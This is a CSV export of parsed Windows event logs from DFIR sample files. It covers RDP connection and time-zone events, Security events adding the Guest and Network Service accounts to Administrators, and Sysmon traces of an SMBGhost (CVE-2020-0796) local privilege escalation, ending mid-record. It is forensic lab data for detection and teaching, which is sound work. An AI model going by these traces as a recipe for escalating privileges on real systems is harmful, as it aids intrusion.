22,12996,2020-11-13 11:41:30.1029221,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52728,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52728""}]}}"
23,13017,2020-11-13 11:41:30.2141492,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:64075,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:64075""}]}}"
24,13035,2020-11-13 11:41:30.6389157,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
25,13036,2020-11-13 11:41:30.8173222,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,9568,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#6""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""813""},{""@Name"":""FirstGraphicsReceived"",""#text"":""1203""}]}}"
26,13082,2020-11-13 11:42:04.7334505,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52733,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52733""}]}}"
27,13097,2020-11-13 11:42:18.1443379,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52734,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52734""}]}}"
28,13118,2020-11-13 11:42:18.3059367,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:55988,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:55988""}]}}"
29,13136,2020-11-13 11:42:18.9231464,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7312,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""1920""},{""@Name"":""MonitorHeight"",""#text"":""1080""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
30,13145,2020-11-13 11:42:19.9953360,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,9996,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#8""},{""@Name"":""PromptForCredentials"",""#text"":""1719""},{""@Name"":""PromptForCredentialsDone"",""#text"":""9484""},{""@Name"":""GfxChannelOpened"",""#text"":""15422""},{""@Name"":""FirstGraphicsReceived"",""#text"":""16953""}]}}"
31,13191,2020-11-13 11:47:42.8590860,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52776,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52776""}]}}"
32,13212,2020-11-13 11:47:43.0967506,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:61881,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:61881""}]}}"
33,13230,2020-11-13 11:47:44.1606371,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""200""},{""@Name"":""MonitorHeight"",""#text"":""200""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
34,13232,2020-11-13 11:47:44.2707379,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,9684,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#9""},{""@Name"":""PromptForCredentials"",""#text"":""0""},{""@Name"":""PromptForCredentialsDone"",""#text"":""0""},{""@Name"":""GfxChannelOpened"",""#text"":""1062""},{""@Name"":""FirstGraphicsReceived"",""#text"":""2109""}]}}"
35,13277,2020-11-13 11:48:02.4191601,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52779,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52779""}]}}"
36,13291,2020-11-13 11:48:38.9563492,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52784,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52784""}]}}"
37,13306,2020-11-13 11:49:17.3833541,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1292,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,10.0.2.16:52786,Connection Type: TCP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""TCP""},{""@Name"":""ClientIP"",""#text"":""10.0.2.16:52786""}]}}"
38,13327,2020-11-13 11:49:17.4586294,131,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,1320,MSEDGEWIN10,0,S-1-5-20,RDP server accepted a new TCP connection,,[10.0.2.16]:58260,Connection Type: UDP,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnType"",""#text"":""UDP""},{""@Name"":""ClientIP"",""#text"":""[10.0.2.16]:58260""}]}}"
39,13344,2020-11-13 11:49:18.0531592,168,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,7284,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""MonitorNum"",""#text"":""0""},{""@Name"":""MonitorWidth"",""#text"":""1920""},{""@Name"":""MonitorHeight"",""#text"":""1080""},{""@Name"":""MonitorX"",""#text"":""0""},{""@Name"":""MonitorY"",""#text"":""0""},{""@Name"":""ServerName"",""#text"":""MSEDGEWIN10""}]}}"
40,13354,2020-11-13 11:49:19.4264671,68,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,388,6336,MSEDGEWIN10,0,S-1-5-20,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""ConnectionName"",""#text"":""RDP-Tcp#12""},{""@Name"":""PromptForCredentials"",""#text"":""78""},{""@Name"":""PromptForCredentialsDone"",""#text"":""36735""},{""@Name"":""GfxChannelOpened"",""#text"":""38719""},{""@Name"":""FirstGraphicsReceived"",""#text"":""40547""}]}}"
1,1129,2020-07-09 19:47:00.7191248,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,476,4152,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
2,1213,2020-07-09 20:06:31.7703983,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,476,6944,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
3,1306,2020-07-09 20:43:29.6599365,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,656,4564,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
4,1400,2020-07-09 21:07:05.3769759,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,1428,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
5,1485,2020-07-09 21:28:47.7230117,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,2404,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
6,1567,2020-07-09 21:29:04.4031213,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,6320,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
7,1653,2020-07-09 21:29:24.5381959,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,2552,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
8,1739,2020-07-09 21:30:53.3123085,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,2568,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
9,1825,2020-07-09 21:49:03.6394635,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,6096,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
10,1909,2020-07-09 21:49:20.7278660,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,4884,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
11,1995,2020-07-09 21:49:32.6971727,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,848,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
12,2081,2020-07-09 21:49:52.2658801,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,5252,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
13,2167,2020-07-09 21:55:18.0071721,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,1188,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
14,2251,2020-07-09 21:55:33.4139253,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,2888,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
15,2337,2020-07-09 21:55:49.6495025,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,4400,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
16,2423,2020-07-09 21:56:04.2471146,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,872,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
17,2509,2020-07-09 22:00:10.8449495,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,5632,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
18,2591,2020-07-09 22:00:25.7318900,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,6016,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
19,2677,2020-07-09 22:00:40.3217028,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,7548,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
20,2763,2020-07-09 22:00:58.3744264,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,428,4624,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
21,2858,2020-07-10 10:20:33.5605421,104,Info,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS,Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational,824,4224,MSEDGEWIN10,0,S-1-5-20,Client timezone bias from UTC,,,TimeZoneBias: [1],,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""TimezoneBiasHour"",""#text"":""[1]""}}}"
1,191029,2019-09-22 11:22:05.2017271,4732,LogAlways,Microsoft-Windows-Security-Auditing,Security,624,4452,MSEDGEWIN10,0,,A member was added to a security-enabled local group,MSEDGEWIN10\IEUser (S-1-5-21-3461203602-4096304019-2269080069-1000),,Target: Builtin\Administrators (S-1-5-32-544),SubjectLogonId: 0x27A10F,MemberName: -,MemberSid: S-1-5-21-3461203602-4096304019-2269080069-501,PrivilegeList: -,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Network_Service_Guest_added_to_admins_4732.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""MemberName"",""#text"":""-""},{""@Name"":""MemberSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-501""},{""@Name"":""TargetUserName"",""#text"":""Administrators""},{""@Name"":""TargetDomainName"",""#text"":""Builtin""},{""@Name"":""TargetSid"",""#text"":""S-1-5-32-544""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""SubjectUserName"",""#text"":""IEUser""},{""@Name"":""SubjectDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""SubjectLogonId"",""#text"":""0x27A10F""},{""@Name"":""PrivilegeList"",""#text"":""-""}]}}"
2,191030,2019-09-22 11:23:19.2519258,4732,LogAlways,Microsoft-Windows-Security-Auditing,Security,624,5108,MSEDGEWIN10,0,,A member was added to a security-enabled local group,MSEDGEWIN10\IEUser (S-1-5-21-3461203602-4096304019-2269080069-1000),,Target: Builtin\Administrators (S-1-5-32-544),SubjectLogonId: 0x27A10F,MemberName: -,MemberSid: S-1-5-20,PrivilegeList: -,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Network_Service_Guest_added_to_admins_4732.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""MemberName"",""#text"":""-""},{""@Name"":""MemberSid"",""#text"":""S-1-5-20""},{""@Name"":""TargetUserName"",""#text"":""Administrators""},{""@Name"":""TargetDomainName"",""#text"":""Builtin""},{""@Name"":""TargetSid"",""#text"":""S-1-5-32-544""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-3461203602-4096304019-2269080069-1000""},{""@Name"":""SubjectUserName"",""#text"":""IEUser""},{""@Name"":""SubjectDomainName"",""#text"":""MSEDGEWIN10""},{""@Name"":""SubjectLogonId"",""#text"":""0x27A10F""},{""@Name"":""PrivilegeList"",""#text"":""-""}]}}"
1,339221,2020-07-26 22:26:14.5225705,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3332,4376,MSEDGEWIN10,0,S-1-5-18,ProcessAccess,"SourceUser:  | TargetUser: ",,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 7400, SourceProcessGUID: ",SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"TargetProcessID: 584, TargetProcessGUID: ",TargetImage: C:\Windows\system32\winlogon.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+212ee|UNKNOWN(000001A063DE13D4),False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CVE-2020-0796_SMBV3Ghost_LocalPrivEsc_Sysmon_3_1_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-26 22:26:14.517""},{""@Name"":""SourceProcessGUID"",""#text"":""747f3d96-ff9d-5f1d-0000-00100ac62400""},{""@Name"":""SourceProcessId"",""#text"":""7400""},{""@Name"":""SourceThreadId"",""#text"":""2812""},{""@Name"":""SourceImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""747f3d96-f938-5f1d-0000-00104b500000""},{""@Name"":""TargetProcessId"",""#text"":""584""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\winlogon.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+9fc24|C:\\Windows\\System32\\KERNELBASE.dll+212ee|UNKNOWN(000001A063DE13D4)""}]}}"
2,339222,2020-07-26 22:26:14.5230750,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3332,4376,MSEDGEWIN10,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 3660, ProcessGUID: 747f3d96-0306-5f1e-0000-0010e15f3100","RuleName: ","SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",ParentProcess: C:\Windows\System32\winlogon.exe,"ParentProcessID: 584, ParentProcessGUID: 747f3d96-f938-5f1d-0000-00104b500000",ParentCommandLine: winlogon.exe,cmd,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CVE-2020-0796_SMBV3Ghost_LocalPrivEsc_Sysmon_3_1_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-26 